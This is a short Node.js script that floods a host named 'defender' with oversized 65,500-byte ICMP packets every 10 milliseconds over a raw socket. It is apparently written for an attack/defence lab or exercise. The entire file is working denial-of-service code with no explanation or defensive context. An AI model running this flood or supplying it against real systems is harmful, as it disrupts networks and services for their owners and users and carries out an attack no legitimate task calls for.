
const raw = require('raw-socket');
const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
const target = { address: 'defender' };

const sendLargeIcmpPacket = () => {
    const buffer = Buffer.alloc(65500);
    socket.send(buffer, 0, buffer.length, target.address, () => {});
};

setInterval(sendLargeIcmpPacket, 10);
